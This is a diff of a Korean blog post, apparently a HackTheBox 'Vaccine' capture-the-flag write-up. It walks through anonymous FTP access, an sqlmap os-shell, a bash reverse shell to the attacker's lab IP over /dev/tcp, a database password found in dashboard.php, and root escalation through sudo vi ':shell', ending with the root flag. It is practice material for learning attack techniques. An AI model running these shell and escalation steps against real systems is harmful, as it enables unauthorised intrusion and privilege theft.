@@ -1,12 +1,13 @@
 ---
 title: HTB Vaccine Write-up
 categories: [HackTheBox, Basic]
-tags: [HackTheBox]
+tags: [HackTheBox, sudo-l, shell, sqlmap, os-shell, crack, john, gobuster, ftp, visudo]
 image:
     path: /assets/image_post/20240226223335.png
 ---
 
 ![](../assets/image_post/20240226223511.png)
+
 nmap scan 결과를 우선 보자.
 ``` bash
 ┌──(root㉿9048af13b510)-[/]
@@ -51,7 +52,7 @@ Finished
 ===============================================================
 ```
 
-열려있는 ftp 서비스에 대해 anonymous로 접속을 시도해보니 열려있기에 업로드 되어 있는 압축 파일을 다운로드 했다.
+열려 있는 ftp 서비스에 익명으로 접근해보니 성공적으로 연결되었다. 연결 이후 존재하는 파일을 다운로드 하였다.
 ``` bash
 ┌──(root㉿9048af13b510)-[/]
 └─# ftp anonymous@10.129.19.142
@@ -294,7 +295,7 @@ listening on [any] 443 ...
 connect to [10.10.14.175] from (UNKNOWN) [10.129.250.55] 50172
 ```
 
-위 방식으로 파일을 보려면 대상 서버에 python으로 서버를 띄워 직접 공격자 서버로 파일을 옮겨 봐야했다. 아래와 같이 내용이 보이지 않는다.
+아래는 파일 내용이 분명 존재하는 파일이지만, os-shell로는 확인이 불가한 특이한 현상이 발생하였다. 파일 내용을 보려면 하나하나 python 서버를 띄워 별도로 옮기는 불편한 과정이 발생한다.
 ``` bash
 os-shell> cat /var/www/html/dashboard.php
 
@@ -303,15 +304,101 @@ os-shell> cat /var/www/html/dashboard.php
 No output
 ```
 
-쉘 연결하는 방법은 다른 사람의 글을 참고했다. 왜인지는 모르겠으나, `bash -c`를 붙여서 실행해주어야 한다. 그렇지 않을 경우 쉘이 연결되지 않으며 nc의 경우 해당 방식으로도 실패한다.
+결국 shell 연결하는 방법은 다른 사람의 글을 참고했다. 왜인지는 모르겠으나, `bash -c`를 붙여서 실행해주어야 한다. 그렇지 않을 경우 쉘이 연결되지 않으며 nc의 경우 해당 방식으로도 실패한다. 
 ``` bash
 os-shell> bash -c 'sh -i >& /dev/tcp/10.10.14.175/443 0>&1'
 ```
 
-
-
-```
+이후 [shell 입출력 연결](https://read-min.github.io/posts/shell-io-conntect/)을 진행하고, 주요 파일을 찾던 중 dashboard.php에 현재 로그인한 계정의 password 정보가 있음을 하나 하나 찾아 보았다.
+``` bash
 ┌──(root㉿kali)-[/home/user]
-└─# cat dashboard.php| grep password
+└─# cat /var/www/html/dashboard.php| grep password
           $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
 ```
+
+이미 로그인한 계정의 password 정보를 갖고 어디에 사용하는가 했더니 `sudo -l` 명령을 통해 지금 로그인한 계정으로 `sudo` 실행 가능한 명령어 목록을 볼 수 있다.
+``` bash
+postgres@vaccine:/var/lib/postgresql/11/main$ sudo -l
+sudo -l
+[sudo] password for postgres: P@s5w0rd!
+
+Matching Defaults entries for postgres on vaccine:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
+    XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    mail_badpass
+
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+```
+
+`/bin/vi /etc/postgresql/11/main/pg_hba.conf`을 실행하여 해당 파일의 내용을 볼 수 있다. (사실 파일 내용은 중요하지 않았다.)
+> pg_hba.conf는 PostgreSQL 데이터베이스 서버에서 클라이언트의 연결을 어떻게 허용 또는 거부할지를 정의하는 PostgreSQL Host-Based Authentication Configuration 파일입니다. 
+``` bash
+# TYPE  DATABASE        USER            ADDRESS                 METHOD
+
+local   all             postgres                                ident
+# "local" is for Unix domain socket connections only
+local   all             all                                     peer
+# IPv4 local connections:
+host    all             all             127.0.0.1/32            md5
+# IPv6 local connections:
+host    all             all             ::1/128                 md5
+# Allow replication connections from localhost, by a user with the
+# replication privilege.
+local   replication     all                                     peer
+host    replication     all             127.0.0.1/32            md5
+host    replication     all             ::1/128                 md5
+```
+
+파일 내용이 중요하지 않다고 한 것은 바로 vi(vim)의 기능 중에 `:shell` 이란 기능을 통해 실행 권한에 따른 shell을 획득 할 수 있다. 여기서 중요한점은 `/bin/vi /etc/postgresql/11/main/pg_hba.conf` 실행 시 앞에 꼭 `sudo`를 붙여야 한다. 그렇지 않으면 일반 권한으로 실행되기에 붙여야 한다.
+``` bash
+$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+# The first field is the connection type: "local" is a Unix-domain
+# socket, "host" is either a plain or SSL-encrypted TCP/IP socket,
+# "hostssl" is an SSL-encrypted TCP/IP socket, and "hostnossl" is a
+# plain TCP/IP socket.
+#
+:shell
+```
+이제 root shell을 획득하여 아래와 같이 flag를 볼 수 있다.
+``` bash
+root@vaccine:/var/lib/postgresql/11/main# cat /root/root.txt
+dd6e058e814260bc70e9bbdef2715849
+```
+
+참고로 `sudo -l`을 통해 실행 가능한 명령어는 root 권한으로 visudo를 입력하여 설정 가능하며, 아래와 같이 postgres에 위에서 보았던 vi 명령어가 등록되어 있는 것을 볼 수 있다.
+``` bash
+root@vaccine:/var/lib/postgresql# sudo visudo
+
+...
+##
+## User privilege specification
+##
+root ALL=(ALL) ALL
+
+## Uncomment to allow members of group wheel to execute any command
+# %wheel ALL=(ALL) ALL
+
+## Same thing without a password
+# %wheel ALL=(ALL) NOPASSWD: ALL
+
+## Uncomment to allow members of group sudo to execute any command
+%sudo   ALL=(ALL) ALL
+
+## Uncomment to allow any user to run sudo if they know the password
+## of the user they are running the command as (root by default).
+# Defaults targetpw  # Ask for the password of the target user
+# ALL ALL=(ALL) ALL  # WARNING: only use this together with 'Defaults targetpw'
+
+## Read drop-in files from /etc/sudoers.d
+@includedir /etc/sudoers.d
+
+postgres ALL=(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+```
+
+`sudo -l`, `vi -> shell`, `sqlmap->os-shell`, `crack` 등 다양한 지식이 필요한 문제였다. 모르는 부분이 많았던 만큼, 추후에 도움이 되지 않을까 싶다.
+![](../assets/image_post/20240228160753.png)
+
+
